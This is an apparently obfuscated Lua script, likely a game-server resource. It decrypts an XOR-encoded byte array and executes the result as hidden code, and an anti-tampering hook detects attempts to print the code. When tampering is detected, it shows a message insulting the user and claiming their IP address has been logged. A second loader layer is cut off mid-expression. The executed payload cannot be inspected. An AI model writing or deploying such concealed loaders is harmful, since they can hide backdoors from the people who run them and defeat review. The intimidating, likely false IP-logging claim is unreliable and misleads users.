bM7XjYIiAm1PlFHTJOgjn2sgQ6Srl3pqAnlkxkXMBukORQw0sVgmlVlm; xX6TuDGv1tIo7xp1lfMozreDen7N2LJpYtyqI3YPMQ1odeyjGmkP4OYYMiHumO7bv89SA =
uUQGyYyKwSsNyh10d1mYkDfFOtdE9BBEDM44CjQpezyQqt3Gg3joYMsnqrL; d8gZAKhgs4053vIQgP0O4B1akU12jxYhgxQe1hdLGOjbsf5EqAtCVMj2ekkvAegYrQ =
xX6TuDGv1tIo7xp1lfMozreDen7N2LJpYtyqI3YPMQ1odeyjGmkP4OYYMiHumO7bv89SA; aM6L1SyZS0oiBL97AIKfSj3zDEmhXXyw1Ln1tiBILTOsvnEDE2Dppu6qPi7R =
d8gZAKhgs4053vIQgP0O4B1akU12jxYhgxQe1hdLGOjbsf5EqAtCVMj2ekkvAegYrQ; s5woIZUHNzkw2QzSBh1uD6jLS0hS5RvoiUSpPKlAcsq8yZdfefSZ2Lrfr =
aM6L1SyZS0oiBL97AIKfSj3zDEmhXXyw1Ln1tiBILTOsvnEDE2Dppu6qPi7R; kEqK1gw81GUCK8QZBTrj294MENhHTQSX3H9Wp12fWny0vtzw3ZxDuKt =
s5woIZUHNzkw2QzSBh1uD6jLS0hS5RvoiUSpPKlAcsq8yZdfefSZ2Lrfr; qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU =
kEqK1gw81GUCK8QZBTrj294MENhHTQSX3H9Wp12fWny0vtzw3ZxDuKt; wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX = function(
  a)
  K, F = 1038509058322578, 16384 + 9286; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; jw72fQu4AczFfW1hXFs7vonEaKZ7MzgxXmG3PNuaWMAbA1BGusQ = function(b)
  co = coroutine.create(b)
  e5vxkUbHmRkZNgHFEeAmj20rNLFnhky7X9XeeIX7PxmrUMHOCiHGfbv9UD2B = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(e5vxkUbHmRkZNgHFEeAmj20rNLFnhky7X9XeeIX7PxmrUMHOCiHGfbv9UD2B, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return e5vxkUbHmRkZNgHFEeAmj20rNLFnhky7X9XeeIX7PxmrUMHOCiHGfbv9UD2B
end; uXNQUjyyJ5cFmGq8CLsBNWvnAybGq7FkGojvdCXWcNxEuEkxrlbfFz5p2pxEvvf8CD6i90oQuT0 = function(f, g)
  lRq7WRCj7TUpS23w4NYYr6FAQFoBePeNLQMbimzvxTWRfsj2N1TxENuk4eLATDlaAAr3BU = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; oibBEWhaZUfdfMphZntjS7ZO22lmZK0rX6SPNuwblP4Y31uy7LMGriviXcJE2 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; pilInn9OG4fHUKiC8Xh2EAefGhmXw0cmVomOxXbCxPyHzQJPzX9uRHjDtEjDpynQ4GUW4y041y = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      lRq7WRCj7TUpS23w4NYYr6FAQFoBePeNLQMbimzvxTWRfsj2N1TxENuk4eLATDlaAAr3BU(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; yQssy2NVzU1eqa2k77DvmVqEffKNZeueyFrpazYgPiKpRWc54GywoRUn25jSsqx9D7QbkxL2MNh = function(p, n)
    eZH5zZ6PJqesc4NH1f5DR9QU7RiPLKdpqrHbSP39hI5sWqXrZK8RaEl2v = ""
    for k, q in pairs(p) do eZH5zZ6PJqesc4NH1f5DR9QU7RiPLKdpqrHbSP39hI5sWqXrZK8RaEl2v =
      eZH5zZ6PJqesc4NH1f5DR9QU7RiPLKdpqrHbSP39hI5sWqXrZK8RaEl2v ..
      qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU
      [wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('7A') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('C7') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('2D') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('78') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F9') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('DE')]
      [wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('AA') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('2B') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('10') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('2D')](
      q) end
    ; n(eZH5zZ6PJqesc4NH1f5DR9QU7RiPLKdpqrHbSP39hI5sWqXrZK8RaEl2v)
  end; oibBEWhaZUfdfMphZntjS7ZO22lmZK0rX6SPNuwblP4Y31uy7LMGriviXcJE2(f,
    function(r) pilInn9OG4fHUKiC8Xh2EAefGhmXw0cmVomOxXbCxPyHzQJPzX9uRHjDtEjDpynQ4GUW4y041y(r, g,
        function(s) yQssy2NVzU1eqa2k77DvmVqEffKNZeueyFrpazYgPiKpRWc54GywoRUn25jSsqx9D7QbkxL2MNh(s,
            function(t) if #jw72fQu4AczFfW1hXFs7vonEaKZ7MzgxXmG3PNuaWMAbA1BGusQ(qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU[wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('5F') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('46') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('10') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F7')]) == 1 then if qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU[wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('5F') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('46') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('10') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F7')] == qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU[wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('93') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('2D') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('78') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F9') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('C7')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU[wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('5F') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('46') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('10') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F7')](t) then
                    qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU
                        [wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('5F') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('46') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('10') .. wIT3QVd60uHMkV8OEkdGG18xkcTktyUmTc4RSx4dhkgpgx4Czd0sDDWdh7FoRDX('F7')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; uXNQUjyyJ5cFmGq8CLsBNWvnAybGq7FkGojvdCXWcNxEuEkxrlbfFz5p2pxEvvf8CD6i90oQuT0(
{ 749, 611, 1033, 921, 1071, 765, 1012, 850, 723, 762, 1200, 664, 800, 835, 683, 736, 693, 1067, 1188, 1138, 778, 822,
  1001, 568, 1139, 876, 801, 832, 986, 997, 675, 686, 799, 804, 1078, 873, 793, 1157, 733, 709, 838, 600, 766, 970, 916,
  883, 1201, 551, 889, 1003, 910, 859, 984, 751, 922, 750, 1097, 673, 562, 1090, 776, 663, 569, 583, 1177, 554, 902,
  1208, 771, 642, 1127, 983, 961, 1082, 757, 1051, 617, 580, 818, 629, 605, 1194, 668, 1037, 1156, 590, 1212, 716, 697,
  878, 713, 626, 747, 645, 777, 884, 598, 682, 814, 1054, 553, 857, 1069, 806, 1189, 1113, 880, 608, 962, 666, 1159, 571,
  935, 967, 773, 1063, 637, 1152, 549, 1028, 791, 659, 1064, 610, 1193, 669, 1073, 634, 775, 678, 908, 1129, 1025, 993,
  947, 1039, 905, 901, 1000, 871, 702, 641, 987, 1211, 872, 1185, 543, 1184, 829, 851, 1029, 759, 624, 1176, 1061, 895,
  853, 1128, 703, 691, 689, 949, 1011, 710, 1191, 1076, 1034, 952, 864, 837, 644, 622, 1171, 1143, 578, 566, 681, 805,
  582, 998, 960, 587, 570, 1007, 564, 909, 1085, 1203, 721, 820, 1104, 1162, 662, 754, 746, 934, 1018, 1022, 555, 653,
  839, 1112, 734, 1068, 927, 739, 730, 810, 1108, 1174, 817, 1155, 768, 1080, 1160, 836, 1145, 647, 690, 912, 994, 1120,
  841, 704, 1210, 743, 834, 1124, 1008, 1065, 745, 802, 719, 1036, 1144, 685, 606, 1109, 1035, 1083, 953, 925, 1117,
  1149, 881, 1102, 1137, 635, 1045, 623, 919, 813, 1153, 996, 1100, 784, 1091, 1015, 955, 1205, 694, 597, 936, 890, 1122,
  1021, 648, 742, 658, 565, 632, 753, 808, 1111, 971, 708, 1164, 573, 1043, 862, 717, 1126, 1056, 894, 652, 938, 929,
  1070, 877, 646, 732, 975, 687, 782, 1087, 639, 1084, 557, 725, 701, 1121, 1053, 638, 698, 1052, 660, 761, 941, 699,
  767, 548, 744, 1146, 601, 979, 550, 860, 1095, 1204, 559, 737, 1167, 1017, 886, 772, 826, 847, 561, 546, 1136, 613,
  625, 1154, 1044, 640, 920, 892, 1089, 867, 1032, 855, 756, 959, 875, 981, 630, 946, 897, 1086, 729, 798, 728, 789, 650,
  1123, 579, 1099, 1058, 558, 1101, 560, 591, 651, 816, 1024, 1199, 1130, 677, 918, 585, 1027, 846, 1182, 1038, 1049,
  618, 665, 763, 695, 973, 1014, 726, 1135, 797, 948, 1168, 586, 915, 1116, 619, 1005, 1151, 1072, 628, 612, 741, 815,
  595, 903, 1115, 840, 845, 891, 1057, 900, 1198, 700, 933, 1186, 831, 932, 752, 1088, 1175, 956, 727, 657, 584, 764,
  788, 968, 1209, 545, 589, 1169, 868, 1026, 823, 899, 977, 985, 942, 1119, 616, 999, 945, 1092, 780, 1079, 1147, 989,
  904, 930, 707, 1134, 1163, 604, 1050, 1020, 620, 1023, 1133, 792, 607, 1110, 917, 670, 577, 819, 1142, 982, 965, 1006,
  1009, 924, 684, 631, 593, 1060, 896, 715, 643, 1077, 718, 633, 656, 1042, 1196, 1132, 594, 939, 696, 842, 844, 769,
  614, 688, 692, 1206, 882, 667, 706, 1181, 861, 661, 1197, 913, 1047, 848, 1004, 1019, 603, 1114, 574, 774, 972, 679,
  856, 1094, 1074, 787, 964, 1207, 1165, 547, 576, 738, 1107, 807, 674, 599, 887, 609, 854, 928, 830, 1002, 1075, 795,
  812, 1059, 1180, 1103, 556, 907, 636, 1040, 654, 988, 712, 1093, 976, -1, 56, 112, 118, 64, 57, 71, 41, 81, 89, 99, 45,
  13, 102, 73, 5, 118, 74, 119, 94, 53, 181, 75, 69, 121, 26, 52, 29, 70, 15, 124, 27, 22, 239, 81, 27, 16, 87, 19, 185,
  111, 83, 122, 17, 37, 24, 233, 74, 24, 122, 154, 81, 83, 74, 29, 25, 23, 65, 87, 80, 43, 74, 67, 8, 2, 27, 82, 82, 114,
  32, 23, 23, 25, 241, 18, 21, 83, 81, 4, 214, 70, 77, 99, 117, 69, 186, 70, 28, 30, 65, 31, 118, 52, 17, 80, 22, 36, 24,
  119, 29, 20, 62, 126, 95, 93, 31, 57, 199, 87, 86, 27, 80, 94, 147, 74, 14, 68, 74, 60, 65, 86, 88, 3, 68, 80, 119, 89,
  63, 113, 95, 42, 87, 20, 66, 221, 9, 62, 68, 73, 113, 114, 40, 35, 4, 68, 116, 83, 16, 90, 24, 95, 47, 19, 121, 69, 31,
  20, 127, 62, 69, 19, 85, 87, 169, 122, 94, 17, 69, 77, 190, 48, 8, 30, 91, 69, 121, 22, 88, 188, 101, 19, 35, 126, 72,
  87, 80, 69, 121, 7, 209, 83, 110, 100, 81, 2, 3, 50, 125, 235, 95, 7, 87, 70, 56, 86, 100, 50, 107, 87, 5, 27, 16, 84,
  50, 81, 112, 64, 4, 101, 57, 66, 69, 82, 89, 106, 63, 4, 47, 154, 106, 1, 9, 90, 81, 2, 109, 118, 199, 86, 5, 74, 240,
  80, 69, 246, 43, 20, 121, 56, 106, 25, 24, 144, 76, 33, 117, 68, 58, 54, 8, 40, 138, 70, 6, 91, 63, 17, 137, 7, 84,
  113, 88, 38, 56, 91, 94, 17, 47, 82, 219, 83, 83, 219, 113, 23, 158, 88, 31, 82, 125, 31, 194, 103, 0, 77, 73, 121, 6,
  2, 121, 121, 98, 87, 7, 96, 42, 83, 241, 7, 46, 40, 83, 81, 6, 69, 122, 74, 77, 79, 20, 38, 217, 67, 231, 22, 7, 22,
  21, 10, 22, 56, 85, 109, 66, 64, 77, 31, 184, 27, 88, 21, 125, 91, 189, 23, 80, 162, 56, 83, 94, 21, 137, 46, 19, 89,
  83, 187, 68, 52, 74, 48, 31, 20, 122, 66, 121, 107, 19, 21, 229, 23, 23, 90, 122, 85, 23, 23, 101, 122, 70, 82, 0, 53,
  15, 254, 123, 89, 9, 79, 219, 116, 20, 86, 14, 28, 245, 68, 68, 103, 91, 24, 9, 221, 104, 3, 23, 48, 3, 211, 179, 71,
  35, 211, 86, 21, 102, 121, 79, 18, 51, 23, 242, 19, 48, 44, 22, 23, 126, 20, 60, 83, 87, 48, 11, 81, 69, 129, 6, 112,
  118, 67, 49, 65, 58, 28, 68, 61, 80, 191, 80, 177, 70, 11, 139, 60, 28, 107, 23, 29, 34, 122, 54, 60, 21, 36, 66, 36,
  15, 102, 96, 36, 179, 106, 63, 46, 27, 97, 118, 63, 85, 80, 12, 5, 29, 90, 113, 3, 113, 186, 201, 80, 23, 73, 82, 124,
  89, 22, 93, 109, 18, 75, 82, 21, 41, 94, 90, 68, 90, 68, 118, 67, 2, 89, 2, 50, 2, 117, 63, 73, 25, 143, 16, 31, 83,
  54, 4, 18, 91, 0, 81, 23, 50, 24, 74, 17, 23, 75, 56, 7, 102, 10, 71, 90, 27, 20, 69, 117, 93, 1, 36, 118, 56, 53, 66,
  187, 69, 50, 23, 58, 21, 27, 67, 94, 10, 57, 115, 89, 102, 5, 23, 109, 23, 75, 83, 89, 24, 123, 46, 111, 63, 25, 106,
  48, 108, 82, 88, 69, 22, 82, 59, 90, 24, 82, 23, 87, 16, 104, 86, 84, 201, 3, 69, 21, 22, 77, 62, 203, 30, 44, 4, 12,
  81, 118, 19, 118, 90, 244, 36, 100, 97, 17, 71, 35, 54, 243, 83, 90, 75, 12, 115, 27, 229, 87, 115, 125, 16, 53, 84,
  39, 21, 75, 158, 4, 30, 95, 110, 23, 65, 3, 71, 223, 127, 20, 221, 22, 80, 22, 21, 14, 113, 195, 17, 122, 65, 118, 31,
  4, 22, 106, 21, 14 }, "apr476Vjk6zsdeYwJw7UV5WZ54"); vwcQ3DwoSoFOb8SgieleEGqoUfeJ38PwL1TNuj0UrPxWlJUN4TWwBkru705FoGNrJqMCazbogq =
qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU; rKddCrTBd46qHUkCKoY1f5iRVnMnUdmQNcMnov5jSURV8OaxGYlGDHV4 =
qxl24E7DWrtvSntq7AWxZkeu8s67e2lETw467qg5iWgR0XXc4LazesVU; owKT1cHN2khGNoX4elsrgw5vhFPwhtmQw5Ui5qpyOHuCwxXYLLp7u7dH44mAyYDJnGmQpHN4 =
rKddCrTBd46qHUkCKoY1f5iRVnMnUdmQNcMnov5jSURV8OaxGYlGDHV4; xkczmyS3TS9AnlhD7BgsMPzBvqHU6dKuYSzV2x72vXzxaVSFb6PdCMVCYRbvHhdSlY =
owKT1cHN2khGNoX4elsrgw5vhFPwhtmQw5Ui5qpyOHuCwxXYLLp7u7dH44mAyYDJnGmQpHN4; vWJddMUIHh1Rm9pEGbzrbit9cLhDW5aPQ9WiH7GRYJOWplqNurEVrMvWwfFpWn2OZEW =
xkczmyS3TS9AnlhD7BgsMPzBvqHU6dKuYSzV2x72vXzxaVSFb6PdCMVCYRbvHhdSlY; w4nGkuPWlMnLWARgzBXtf5EC0SLdv4ZsBf1MDE5p1FCXhKlr3w3solDVRWX5vGqNP =
vWJddMUIHh1Rm9pEGbzrbit9cLhDW5aPQ9WiH7GRYJOWplqNurEVrMvWwfFpWn2OZEW; wdAAnnRZV9Esj25f2OeTA9DM3JlOJKvHYLmh8ECVbmQzUy0smEv7bbFUhInNqt78O04j3WJZT =
w4nGkuPWlMnLWARgzBXtf5EC0SLdv4ZsBf1MDE5p1FCXhKlr3w3solDVRWX5vGqNP; nqDukfLeQseQfNVquLAO2zZvwaX9KHrtsut605CuC6SOQRXDZt9Bc6rVe6XiKYwn4A =
wdAAnnRZV9Esj25f2OeTA9DM3JlOJKvHYLmh8ECVbmQzUy0smEv7bbFUhInNqt78O04j3WJZT; gKiTcGiZTFKSQIc5XRFPlhT7gGVIKs4ZTV1tFQQq5jhGF0rnW7faNp =
nqDukfLeQseQfNVquLAO2zZvwaX9KHrtsut605CuC6SOQRXDZt9Bc6rVe6XiKYwn4A; ezm68g7LagC0hFvWyZQtSONyBTR3GYnfXZamDdU5zSo1wsKrrwmphPu8H =
gKiTcGiZTFKSQIc5XRFPlhT7gGVIKs4ZTV1tFQQq5jhGF0rnW7faNp; mfxpGu1SmtqbxjP1J5zjdJCiC7jFnOF6q4EBEVPRn1aRMVHBL30kl9paRzFgEfy =
ezm68g7LagC0hFvWyZQtSONyBTR3GYnfXZamDdU5zSo1wsKrrwmphPu8H; mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L =
mfxpGu1SmtqbxjP1J5zjdJCiC7jFnOF6q4EBEVPRn1aRMVHBL30kl9paRzFgEfy; wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA = function(
  a)
  K, F = 7305826087941177, 16384 + 1320; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; f8QYsSTaDXbQ0tNaM5v5slLP4xbxXL6liYIJH26cA7qrJJyWbjNlreZ = function(b)
  co = coroutine.create(b)
  wEiFuqiRInYilX3TsV80MAavCdl604JtVLRU1l4BaHb2hmQWs43EOUaYsulhflj770 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(wEiFuqiRInYilX3TsV80MAavCdl604JtVLRU1l4BaHb2hmQWs43EOUaYsulhflj770, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return wEiFuqiRInYilX3TsV80MAavCdl604JtVLRU1l4BaHb2hmQWs43EOUaYsulhflj770
end; kUxj4q0ymAlLpf4TDu6OgVvabVyOiqxY0lIdN6KZkwMBAA2GD3mdP7wR3e72FVpn86 = function(f, g)
  bazSYYO8uQJJ1FeMhtCptKBpAsUsDvpKalDz9N9gzNGuumUDU2ER = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; kxWgbkerPWxvykUYmTdvkevGMwwlNupQFBNeY1ZASA6c9eJR6EYz8ZEJ584obNhdp6eW = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; runX5hOiuVpf2YUTpdXBIbCUSGJoIKzFaxsxKnTZkglQ13TdtDrw7cOlrQ8aOi2BkwVcyXk3Fz5 = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      bazSYYO8uQJJ1FeMhtCptKBpAsUsDvpKalDz9N9gzNGuumUDU2ER(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; hFVxrGGOA8RrPyoGFPXWvjbiLKouBfdDZCgaffBgJ2yJvR48nAMXOAs2IvOHSCJorvz9NRqob = function(p, n)
    c07dMif97oJPXcBgzusojlJK9FnVvYkTFfBPiiWLLcGjqUNDlyW6Cao7V0U = ""
    for k, q in pairs(p) do c07dMif97oJPXcBgzusojlJK9FnVvYkTFfBPiiWLLcGjqUNDlyW6Cao7V0U =
      c07dMif97oJPXcBgzusojlJK9FnVvYkTFfBPiiWLLcGjqUNDlyW6Cao7V0U ..
      mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L
      [wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('68') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('95') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3B') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('A6') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('87') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('4C')]
      [wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('98') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('79') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3E') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3B')](
      q) end
    ; n(c07dMif97oJPXcBgzusojlJK9FnVvYkTFfBPiiWLLcGjqUNDlyW6Cao7V0U)
  end; kxWgbkerPWxvykUYmTdvkevGMwwlNupQFBNeY1ZASA6c9eJR6EYz8ZEJ584obNhdp6eW(f,
    function(r) runX5hOiuVpf2YUTpdXBIbCUSGJoIKzFaxsxKnTZkglQ13TdtDrw7cOlrQ8aOi2BkwVcyXk3Fz5(r, g,
        function(s) hFVxrGGOA8RrPyoGFPXWvjbiLKouBfdDZCgaffBgJ2yJvR48nAMXOAs2IvOHSCJorvz9NRqob(s,
            function(t) if #f8QYsSTaDXbQ0tNaM5v5slLP4xbxXL6liYIJH26cA7qrJJyWbjNlreZ(mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L[wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('2D') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('B4') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3E') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('C5')]) == 1 then if mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L[wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('2D') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('B4') .. 